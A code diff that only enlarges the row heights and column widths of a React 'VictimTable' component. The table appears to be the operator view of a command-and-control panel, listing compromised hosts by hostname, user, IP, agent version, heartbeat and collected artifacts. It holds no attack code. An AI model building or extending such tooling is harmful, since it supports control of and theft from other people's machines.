@@ -105,10 +105,10 @@ export function VictimTable({
         </div>
       ) : null}
       <div className="min-h-0 flex-1 overflow-auto">
-        <Table className="min-w-[980px] font-mono">
+        <Table className="min-w-[1040px] font-mono">
           <THead>
             <TR className="hover:bg-transparent">
-              <TH className="w-8">
+              <TH className="w-10">
                 <input
                   type="checkbox"
                   aria-label="Seleccionar todos"
@@ -124,7 +124,7 @@ export function VictimTable({
                   </button>
                 </TH>
               ))}
-              <TH className="w-9">
+              <TH className="w-10">
                 <Dropdown>
                   <DropdownTrigger asChild><Button variant="ghost" size="icon" title="Columnas"><Columns3 className="h-3.5 w-3.5" /></Button></DropdownTrigger>
                   <DropdownContent align="end">
@@ -148,29 +148,29 @@ export function VictimTable({
                   data-index={index}
                   tabIndex={-1}
                   aria-selected={isSelected}
-                  className={cn('h-8 cursor-default outline-none focus-visible:ring-1 focus-visible:ring-inset focus-visible:ring-brand/70', isSelected && 'bg-brand/10 hover:bg-brand/15')}
+                  className={cn('h-10 cursor-default outline-none focus-visible:ring-1 focus-visible:ring-inset focus-visible:ring-brand/70', isSelected && 'bg-brand/10 hover:bg-brand/15')}
                   onClick={(event) => pick(victim, index, event)}
                   onDoubleClick={() => onOpen(victim)}
                   onContextMenu={(event) => { event.preventDefault(); onSelect(isSelected ? selected : [victim.id]); onMenu(victim, event.clientX, event.clientY); }}
                 >
-                  <TD className="h-8" onClick={(event) => event.stopPropagation()}>
+                  <TD className="h-10" onClick={(event) => event.stopPropagation()}>
                     <input type="checkbox" aria-label={`Seleccionar ${victim.hostname}`} checked={isSelected} onChange={() => pick(victim, index, { shiftKey: false } as React.MouseEvent)} />
                   </TD>
-                  {columns.includes('host') ? <TD className="h-8"><span className="text-ink">{victim.hostname}</span><span className="ml-2 text-2xs text-muted/60">{short(victim.id, 8)}</span></TD> : null}
-                  {columns.includes('user') ? <TD className="h-8 text-muted">{victim.username}</TD> : null}
-                  {columns.includes('os') ? <TD className="h-8"><span className={osTone(victim.os)}>{osIcon(victim.os)} {victim.os}</span><span className="ml-1 text-2xs text-muted/60">{victim.osVersion.split('.')[0]}</span></TD> : null}
-                  {columns.includes('version') ? <TD className="h-8 text-2xs text-muted">{victim.agentVersion || '—'}</TD> : null}
-                  {columns.includes('profile') ? <TD className="h-8"><Badge tone={victim.profile === 'full' ? 'brand' : 'default'}>{victim.profile}</Badge></TD> : null}
-                  {columns.includes('ip') ? <TD className="h-8 text-muted"><span className="mr-1">{flag(victim.countryCode)}</span>{victim.ip ?? '—'}</TD> : null}
-                  {columns.includes('seen') ? <TD className={cn('h-8', victim.online ? 'text-ok' : 'text-muted')}>{ago(victim.lastHeartbeatAt)}</TD> : null}
+                  {columns.includes('host') ? <TD className="h-10"><span className="text-ink">{victim.hostname}</span><span className="ml-2 text-2xs text-muted/60">{short(victim.id, 8)}</span></TD> : null}
+                  {columns.includes('user') ? <TD className="h-10 text-muted">{victim.username}</TD> : null}
+                  {columns.includes('os') ? <TD className="h-10"><span className={osTone(victim.os)}>{osIcon(victim.os)} {victim.os}</span><span className="ml-1 text-2xs text-muted/60">{victim.osVersion.split('.')[0]}</span></TD> : null}
+                  {columns.includes('version') ? <TD className="h-10 text-2xs text-muted">{victim.agentVersion || '—'}</TD> : null}
+                  {columns.includes('profile') ? <TD className="h-10"><Badge tone={victim.profile === 'full' ? 'brand' : 'default'}>{victim.profile}</Badge></TD> : null}
+                  {columns.includes('ip') ? <TD className="h-10 text-muted"><span className="mr-1">{flag(victim.countryCode)}</span>{victim.ip ?? '—'}</TD> : null}
+                  {columns.includes('seen') ? <TD className={cn('h-10', victim.online ? 'text-ok' : 'text-muted')}>{ago(victim.lastHeartbeatAt)}</TD> : null}
                   {columns.includes('socket') ? (
-                    <TD className="h-8">
+                    <TD className="h-10">
                       {victim.socket ? <Badge tone="ok"><Radio className="h-2.5 w-2.5" />ws</Badge> : <Badge tone={victim.online ? 'warn' : 'default'}>{victim.online ? 'hb' : 'off'}</Badge>}
                     </TD>
                   ) : null}
-                  {columns.includes('artifacts') ? <TD className="h-8 num text-muted">{victim._count?.artifacts ?? victim.artifacts ?? 0}</TD> : null}
-                  {columns.includes('group') ? <TD className="h-8">{victim.tags.length === 0 ? <span className="text-muted/50">—</span> : <span className="flex gap-1 overflow-hidden">{victim.tags.slice(0, 2).map((tag) => <Badge key={tag}>{tag}</Badge>)}</span>}</TD> : null}
-                  <TD className="h-8" />
+                  {columns.includes('artifacts') ? <TD className="h-10 num text-muted">{victim._count?.artifacts ?? victim.artifacts ?? 0}</TD> : null}
+                  {columns.includes('group') ? <TD className="h-10">{victim.tags.length === 0 ? <span className="text-muted/50">—</span> : <span className="flex gap-1 overflow-hidden">{victim.tags.slice(0, 2).map((tag) => <Badge key={tag}>{tag}</Badge>)}</span>}</TD> : null}
+                  <TD className="h-10" />
                 </TR>
               );
             })}
